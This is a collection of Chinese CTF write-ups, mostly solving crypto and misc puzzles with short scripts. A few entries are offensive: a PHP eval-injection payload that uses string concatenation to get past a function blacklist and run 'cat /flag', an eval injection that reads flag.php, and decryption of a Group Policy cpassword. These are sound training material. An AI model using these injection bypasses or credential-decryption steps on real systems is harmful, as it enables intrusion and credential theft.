{'key': 92, 'flag': [55, 55, 47, 39, 54, 47, 108, 50, 3, 53, 47, 3, 63, 108, 108, 48, 3, 62, 41, 40, 3, 52, 61, 42, 111, 3, 37, 51, 41, 3, 40, 46, 53, 57, 56, 3, 49, 111, 47, 47, 28, 59, 57, 3, 44, 61, 63, 55, 33]}
```

ascii异或得到flag：

```
flag = [55, 55, 47, 39, 54, 47, 108, 50, 3, 53, 47, 3, 63, 108, 108, 48, 3, 62, 41, 40, 3, 52, 61, 42, 111, 3, 37, 51, 41, 3, 40, 46, 53, 57, 56, 3, 49, 111, 47, 47, 28, 59, 57, 3, 44, 61, 63, 55, 33]
key = 92

for s_flag in flag:
    print(chr(s_flag^key), end = '')
```

###### мааааленькая_задачечка

```
N = 0x7e6a1e6b2e98af9067483629b3cbe204d251b81d6bc26e169a2bae14c3b7f682c0c3a50d373df3b281c5676db53422056b9442db547e4e3a96dd6276aaf538ef78f80702bad7d57e93f696962debc11803118bc8636e4aa2ccfe326800ae52c0eff7f5354a37b6cb883dab2b257ae2e76475783adcd9a16740be87cb27777e17	
e = 7

pad = superpadding
C = 0x52308125663a67f608502c240323b039837735806197b60b9c8bab582f2eb7d2c6b2e51b7cc7e9d56ec900c6f5a11d964b096b437bad2002f4e299ca6afd2dbec78d9b1b5e58bd8d5c4bf918b23506ef8c9fb2f6282de8892d8adb8e6d09c3ec3538e0a5d9a1cd84506846e4f4c1aaef2ac9a03872df6cc7b262592e58351dab
```

带pad的rsa，sage脚本一把梭：

```
from sage.all import *
from Crypto.Util.number import bytes_to_long, long_to_bytes, getPrime

def solve(m, e, n, c):
    P.<x> = PolynomialRing(Zmod(n))
    f = (m + x)^e - c
    f = f.monic()
    m = f.small_roots(epsilon=1/30)
    print(long_to_bytes(int(m[0])))

n = 0x7e6a1e6b2e98af9067483629b3cbe204d251b81d6bc26e169a2bae14c3b7f682c0c3a50d373df3b281c5676db53422056b9442db547e4e3a96dd6276aaf538ef78f80702bad7d57e93f696962debc11803118bc8636e4aa2ccfe326800ae52c0eff7f5354a37b6cb883dab2b257ae2e76475783adcd9a16740be87cb27777e17  
e = 7
c = 0x52308125663a67f608502c240323b039837735806197b60b9c8bab582f2eb7d2c6b2e51b7cc7e9d56ec900c6f5a11d964b096b437bad2002f4e299ca6afd2dbec78d9b1b5e58bd8d5c4bf918b23506ef8c9fb2f6282de8892d8adb8e6d09c3ec3538e0a5d9a1cd84506846e4f4c1aaef2ac9a03872df6cc7b262592e58351dab
pad = b'superpadding'
m = pad + b'\x00'*13
m = bytes_to_long(m)

solve(m, e, n, c)
```

# VULNCON-CTF-2020

#### Cryptography

###### Double

```
Is it Double Encoding?

6fp5ou50v5uj3x35gu4p456g4p15tv5wk5gu5b35gz4p44vm53x
```

一种叫twin-hex（双hex？）的加密，直接在线解密：

https://www.calcresult.com/misc/cyphers/twin-hex.html

```
vulncon{Twin_Hex_Encoding_is_Hard}
```

###### can_you_c_the_password

挨个文件检查，发现一个Groups.xml文件：

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="n00b_us3r" image="0" changed="2020-11-15 00:57:07" uid="{A8043038-7235-4F5E-BE8C-3076F5D31FE8}"><Properties action="C" fullName="" description="" cpassword="HlQWFdlPXQTU7n8W9VbsVTP245DcAJAUQeAZZfkJE/Q8ZlWgwj7CqKl6YiPvKbQFO7PWS7rSwbVtSSZUhJSj5YzjbkKtyXR5fP9VQDEieMU" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" userName="n00b_us3r"/></User>
</Groups>
```

GP3Finder解码得到flag：

```
python3 cli.py -D HlQWFdlPXQTU7n8W9VbsVTP245DcAJAUQeAZZfkJE/Q8ZlWgwj7CqKl6YiPvKbQFO7PWS7rSwbVtSSZUhJSj5YzjbkKtyXR5fP9VQDEieMU

        Group Policy Preference Password Finder (GP3Finder) 5.0.0
        Copyright (C) 2020  Oliver Morton
        This program comes with ABSOLUTELY NO WARRANTY.
        This is free software, and you are welcome to redistribute it
        under certain conditions. See GPLv2 License.

INFO: gp3finder: Decrypted password is 38 characters.
INFO: gp3finder: --------------------------------------
INFO: gp3finder: vulncon{s3cur1ty_h4s_3volv3d_s0__much}
INFO: gp3finder: --------------------------------------
```

###### is_it_magic

```
Can you recover the secret XOR key we used to encrypt the flag?
```

给了个文件smokeaway.jpg.enc，题目提示异或，猜测是jpg图片异或得到了该加密文件。随便找两张jpg图片的文件头异或看下：

```
s1 = 'FF D8 FF E8 00 10 4A 46 49 46 00 01 01 00 00 01 00 00'.split(' ')
s2 = 'FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60'.split(' ')


f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway.jpg.enc', 'rb')

for i in s1:
    a1 = ord(bytes().fromhex(i))
    a2 = ord(f.read(1))
    print(a1^a2, end=',')

print('')
f.close()
f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway.jpg.enc', 'rb')

for i in s2:
    a1 = ord(bytes().fromhex(i))
    a2 = ord(f.read(1))
    print(a1^a2, end=',')

f.close()
```

```
70,204,249,173,113,240,255,177,126,65,203,132,70,205,248,136,112,220,
70,204,249,165,113,240,255,177,126,65,203,132,70,204,248,233,112,188,
```

故可以初步猜测key估是70,204,249,173,113,240,255,177,126,65,203,132或者70,204,249,165,113,240,255,177,126,65,203,132，都试一下：

```
keys = ['70,204,249,173,113,240,255,177,126,65,203,132', '70,204,249,165,113,240,255,177,126,65,203,132']

f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway.jpg.enc', 'rb')
s = f.read()

for num, key in enumerate(keys):
    key = key.split(',')
    index = 0
    s1 = b''
    for i in s:
        sub_key = key[index]
        s1 += chr(ord(i)^int(sub_key))
        index += 1
        if index >= len(key):
            index = 0
    f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway%s.jpg'%num, 'wb')
    f.write(s1)
    f.close()
```

得到的图片中即可看见flag。

#### Miscellaneous

###### All I know was zip

给了一个txt文件，内容为16进制字符串的：

```
0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x6A, 0x5A, 0x85, 0x51, 0xC4, 0xDC,
```

可以转换成zip文件：

```
or_file_path = r'C:\Users\hp430\Desktop\All I know was zip.txt'
result_file_path = r'C:\Users\hp430\Desktop\result.zip'

or_file = open(or_file_path, 'r')
result_file = open(result_file_path, 'wb')

for data in or_file.readlines():
    data = data.strip()
    for sub_data in data.split(','):
        sub_data = sub_data.strip()
        if sub_data:
            save_data = bytearray.fromhex(sub_data[2:])
            result_file.write(save_data)

result_file.close()
```

解压得到一个带密码的pdf文件，用pdfcrack爆破得到弱口令butterfly。

查看pdf，发现有两张图片，其中一张是：

![1](/1.bmp)

谷歌搜图可以发现是D&D 5e Languages中的Draconic，翻译得到flag。

https://5elanguages.website/draconic/

#### OSINT

###### Find The Coin

```
Hackers stole lot of money from Kucoin(Popular exchanger), we found a recent transaction of the value 100,000,000 DX at 26 Nov 2020 happened from the hacker's wallet can you find the tx id for me ?
```

要查一笔区块链交易，直接https://ethplorer.io/搜索即可找到。

# BMZCTF-1st

#### web

###### ezeval

```php+HTML
 <?php
highlight_file(__FILE__);
$cmd=$_POST['cmd'];
$cmd=htmlspecialchars($cmd);
$black_list=array('php','echo','`','preg','server','chr','decode','html','md5','post','get','file','session','ascii','eval','replace','assert','exec','cookie','$','include','var','print','scan','decode','system','func','ini_','passthru','pcntl','open','link','log','current','local','source','require','contents');
$cmd = str_ireplace($black_list,"BMZCTF",$cmd);
eval($cmd);

?> 
```

命令执行，但是过滤常用执行函数，可以利用php顺序执行的特性拼接字符串绕过：

```python
import requests

data = {'cmd':'''(s.y.s.t.e.m)('cat /flag');'''}

print(requests.post('http://www.bmzclub.cn:20458/',data=data).text)
```

# 2020zongheng

#### misc

###### My_Secret

```
LSB have a deep secret

PASS1 is 123456
```

给了一张jpg图片一张png图片一个wav音频。题目提示了lsb还给了密码，直接cloacked-pixel搞起：

```
root@ubuntu:/home/ctf/misc/cloacked-pixel# ./go.sh
[+] Image size: 262x290 pixels.
[+] Written extracted data to flag.
root@ubuntu:/home/ctf/misc/cloacked-pixel# cat flag
38d668578a3686abroot@ubuntu:/home/ctf/misc/cloacked-pixel# cat go.sh
python lsb.py extract stego.png flag 123456
```

题目还提示了deep，给了wav文件，用DeepSound可以处理（密码为lsb得到的38d668578a3686a）得到密码carrier。

题目最后还有一个提示secret，还剩一个jpg文件没用，用OurSecret配合密码carrier得到flag

###### 马赛克

给了一张打了马赛克的图片，用https://github.com/beurtschipper/Depix可去码：

```
root@ubuntu:/home/ctf/misc/Depix# ./go.sh
INFO:root:Loading pixelated image from mosaic.png
INFO:root:Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
INFO:root:Finding color rectangles from pixelated space
INFO:root:Found 93 same color rectangles
INFO:root:91 rectangles left after moot filter
INFO:root:Found 2 different rectangle sizes
INFO:root:Finding matches in search image
INFO:root:Removing blocks with no matches
INFO:root:Splitting single matches and multiple matches
INFO:root:[16 straight matches | 72 multiple matches]
INFO:root:Trying geometrical matches on single-match squares
INFO:root:[39 straight matches | 49 multiple matches]
INFO:root:Trying another pass on geometrical matches
INFO:root:[51 straight matches | 37 multiple matches]
INFO:root:Writing single match results to output
INFO:root:Writing average results for multiple matches to output
INFO:root:Saving output image to: output.png
root@ubuntu:/home/ctf/misc/Depix# cat go.sh
python3 depix.py -p mosaic.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```

# 2021 *CTF

#### misc

###### puzzle

拼图题，给了一张已经混合在一起的图片，理论上不用montage处理了直接上gaps就行，最后需要手动调整下。

题外话：官方wp写了这题忘记对flag进行混淆了所以gaps可行，正规解法应该是：

1. 写脚本，对比图片边缘进行拼合，flag使用的颜色比较独特(43,42,42)，相邻两块的flag断开后，(43,42,42)在两边缘上的位置只有1~2像素之差，长度也是一样，照此拼合即可。
2. 比较简单的一种方法，通过Google识图等找到原图，将原图切成同样块数，和puzzle对比每一块的像素，没有flag的块存在100%符合的对应块，有flag的块的符合度也应在70%以上，按原图拼回即可。

网上找到了一个脚本可以用：

```python
import cv2
from PIL import Image
import numpy as np
import os
import shutil
import threading
# 读取目标图片(原图)
source = cv2.imread(r"C:\Users\hp430\Desktop\demo.jpg")
# 拼接结果
target = Image.fromarray(np.zeros(source.shape, np.uint8))
# 图库目录(切片后的1100张图片)
dirs_path = r"C:\Users\hp430\Desktop\output"
# 差异图片存放目录(跑的时候生成的图片)
dst_path = r"C:\Users\hp430\Desktop\v1"
def match(temp_file):
    # 读取模板图片
    template = cv2.imread(temp_file)
    # 获得模板图片的高宽尺寸
    theight, twidth = template.shape[:2]
    # 执行模板匹配，采用的匹配方式cv2.TM_SQDIFF_NORMED
    result = cv2.matchTemplate(source, template, cv2.TM_SQDIFF_NORMED)
    # 归一化处理
    cv2.normalize(result, result, 0, 1, cv2.NORM_MINMAX, -1)
    # 寻找矩阵（一维数组当做向量，用Mat定义）中的最大值和最小值的匹配结果及其位置
    min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)
    target.paste(Image.fromarray(template), min_loc)
    return abs(min_val)
class MThread(threading.Thread):
    def __init__(self, file_name):
        threading.Thread.__init__(self)
        self.file_name = file_name
    def run(self):
        real_path = os.path.join(dirs_path, k)
        rect = match(real_path)
        if rect > 6e-10:
            print(rect)
            shutil.copy(real_path, dst_path)
count = 0
dirs = os.listdir(dirs_path)
threads = []
for k in dirs:
    if k.endswith('JPG'):
        count += 1
        print("processing on pic" + str(count))
        mt = MThread(k)
        mt.start()
        threads.append(mt)
    else:
        continue
# 等待所有线程完成
for t in threads:
    t.join()
target.show()
# 跑出来后的图片
target.save(r"C:\Users\hp430\Desktop\demo1.jpg")
```

# bugku

#### web

###### web8

```php+HTML
 <?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?> 
```

```
http://114.67.246.176:16235/?hello=show_source(%27flag.php%27)
```

```php+HTML
 <?php
    $flag = 'Too Young Too Simple';
    # echo $flag;
    # flag{ed12b64ce1c11597d50fe2f776256b0a};
?> bool(true) <?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?> 
```

#### re

###### signin

安卓逆向，jeb打开，找到关键逻辑：

![image-20210203110405850](/image-20210203110405850.png)

去R中搜索，发现对应的字符串名称：

![image-20210203110434958](/image-20210203110434958.png)

去strings.xml中找到对应的字符串：

![image-20210203110501604](/image-20210203110501604.png)

#### crypto

###### 你喜欢下棋吗

```
你喜欢下棋吗？
解压密码为小写
442324 43 24 43 35 34 31 54 12 24 4543
```

棋盘密码：

![棋盘密码](/棋盘密码.png)

得到密码thisispolybjus，解压得到：

```
一种5bit的编码
bugku里面的内容为小写
bugku{11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001}
```

博多密码：

```python
code_data = '''00000	null	null
00100	espace	espace
10111	Q	1
10011	W	2
00001	E	3
01010	R	4
10000	T	5
10101	Y	6
00111	U	7
00110	I	8
11000	O	9
10110	P	0
00011	A	-
00101	S	BELL
01001	D	$
01101	F	!
11010	G	&
10100	H	#
01011	J	'
01111	K	(
10010	L	)
10001	Z	"
11101	X	/
01110	C	:
11110	V	;
11001	B	?
01100	N	,
11100	M	.
01000	Carriage Return CR	Carriage Return CR
00010	Line Feed LF	Line Feed LF
11011	Switch to Digits	'''
code_data = code_data.split('\n')
code_datas = {}
code_datas_num = {}
for i in code_data:
    code_datas[i.split('	')[0]] = i.split('	')[1]
    code_datas_num[i.split('	')[0]] = i.split('	')[2]
    if len(i.split('	')[1]) > 1:
        code_datas[i.split('	')[0]] = ' '
    if len(i.split('	')[2]) > 1:
        code_datas_num[i.split('	')[0]] = ' '
print(code_datas)
print(code_datas_num)

s = '.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.'
s= s.replace('.', '1')
s= s.replace('-', '0')
print(s)
s='11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001'
s=s.replace(' ','')
a = ''
num = 0
for i in range(int(len(s)/5)):
    # print(s[i*5:i*5+5])
    if s[i*5:i*5+5] == '11011':
        num = 1
        continue
    if s[i*5:i*5+5] == '11111':
        num = 0
        continue
    if num == 0:
        print(code_datas[s[i*5:i*5+5]], end='')
    else:
        print(code_datas_num[s[i*5:i*5+5]], end='')
```

得到flag：BAUD0TC0DE

###### 小山丘的秘密

```
hill能有什么秘密呢

bugku{PLGTGBQHM}

其中A=1，flag全为小写
```

![小山丘的秘密](/小山丘的秘密.jpg)

希尔密码，提示a=1，默认的是a=0，因此猜测码表由abcdefghijklmnopqrstuvwxyz变为了zabcdefghijklmnopqrstuvwxy

然后根据旗子个数生成解密矩阵：

```python
#!/usr/bin/python
#coding=utf8
#author Xujie Liu
import numpy
from math import sqrt

#密钥
matrix = [[1, 2, 3],
          [0, 1, 4],
          [5, 6, 0]]
#密文
ciphertext = "PLGTGBQHM".lower()
#字母表
alphabet = "zabcdefghijklmnopqrstuvwxy"
N = len(alphabet)
def euclidean(x, y):
    x1 = 1
    y1 = 0
    z1 = x
    x2 = 0
    y2 = 1
    z2 = y 
    while z2 != 1:
        q = (z1 - (z1 % z2)) / z2
        x1 = x1 - q * x2
        y1 = y1 - q * y2
        z1 = z1 - q * z2 
        x1, y1, z1, x2, y2, z2 = x2, y2, z2, x1, y1, z1 
    while x2 < 0:
        x2 += y     
    return x2 
alphabet_to_number = {} 
for i in range(0, len(alphabet)):
    alphabet_to_number[alphabet[i]] = i 
det = numpy.around(numpy.linalg.det(matrix)).astype(numpy.int64)
inv = numpy.around(det * numpy.linalg.inv(matrix)).astype(numpy.int64) 
mul = euclidean(det, N)
inv = mul * inv
for i in range(0, len(inv)):
    for j in range(0, len(inv[i])):
        inv[i][j] = inv[i][j] % N 
ans = '' 
for j in range(0, int(sqrt(len(ciphertext)))):
    cipherarray = []
    for i in range(0, len(inv)):
        cipherarray.append(alphabet_to_number[ciphertext[j * len(inv) + i]])
    plain = numpy.dot(inv, cipherarray) 
    for i in range(0, len(plain)):
        ans += alphabet[ plain[i] % N] 
print ans
```

###### EN-气泡

题目说气泡，猜测是BubbleBabble加密，用脚本跑了一下发现存在套娃：

```python
from bubblepy import BubbleBabble

data='''xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux'''

data = BubbleBabble().decode(data).decode()
print(data)
```

```
xivak-norok-norad-tipol-norol-nipid-tisuk-zotak-nurud-tesil-nitok-hepod-torek-cesuk-coryd-tinak-zorik-nined-tomyl-nosal-hopid-tuvuk-zomek-zupod-tovuk-zumak-zoryd-tipuk-nyruk-zepyd-tonuk-zasol-nunud-tenok-nuvyl-nevax
```

于是加个循环：

```python
from bubblepy import BubbleBabble

data='''xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux'''

for i in range(10):
    try:
        data = BubbleBabble().decode(data).decode()
        print(data)
    except:
        break
```

```
xivak-norok-norad-tipol-norol-nipid-tisuk-zotak-nurud-tesil-nitok-hepod-torek-cesuk-coryd-tinak-zorik-nined-tomyl-nosal-hopid-tuvuk-zomek-zupod-tovuk-zumak-zoryd-tipuk-nyruk-zepyd-tonuk-zasol-nunud-tenok-nuvyl-nevax
ximil-hynyk-rotil-rytek-masal-folif-cysuh-zoboh-zobol-himok-dosyf-fizyx
bugku{th1s_1s_A_Bubb13}
```

# 2021i春秋新年欢乐赛

###### 十二宫的挑衅

![Twelve_palaces_of_serial_killers](/Twelve_palaces_of_serial_killers.png)

黄金12宫加密，不久前才破解的一个著名加密算法，首先用脚本得到Azdecrpt字符串：

```python
ciper="^#@$@#()/>@?==%1(!)>(*+3<#86@-7$^.4&)8%#5&6!=%1#$-$+5&?#!.03!%=@=1010?(*~#??.+)%&.7^8=1%*^=$5$7@@8>&*99@0185(+7)<%3#@^4&@@<.)$3*#%%<<*++.@.?=~**+!==65^@&"
print(ciper)
#ciper:
for i in range(153):
    if((i+1)%17!=0):
        print(ciper[i],end='')
    else:
        print(ciper[i],end='\n')

Azdecrpt=''
for i in range(153):
    Azdecrpt+=ciper[int((i%9)*17+(i*2)%17)]

print("\n")
#Azdecrpt
for i in range(153):
    if((i+1)%17!=0):
        print(Azdecrpt[i],end='')
    else:
        print(Azdecrpt[i],end='\n')
```

```
^#@$@#()/>@?==%1(!)>(*+3<#86@-7$^.4&)8%#5&6!=%1#$-$+5&?#!.03!%=@=1010?(*~#??.+)%&.7^8=1%*^=$5$7@@8>&*99@0185(+7)<%3#@^4&@@<.)$3*#%%<<*++.@.?=~**+!==65^@&
^#@$@#()/>@?==%1(
!)>(*+3<#86@-7$^.
4&)8%#5&6!=%1#$-$
+5&?#!.03!%=@=101
0?(*~#??.+)%&.7^8
=1%*^=$5$7@@8>&*9
9@0185(+7)<%3#@^4
&@@<.)$3*#%%<<*++
.@.?=~**+!==65^@&


^>%..@3*&#(#0+@#+
.@*53)8@+@$+&!%>^
&.@36%&&4@?#<!=.*
9@=(#=@79@<~)8%=^
=0.*/611811)*>@#0
0%8$+@-$1?*53!?7-
+(^(*==$$5*=+#==^
4&~$7%6%.&?#5)%51
!)#?$<<^()8!?7%<@
```

Azdecrpt得到flag：

![image-20210228195419290](/image-20210228195419290.png)

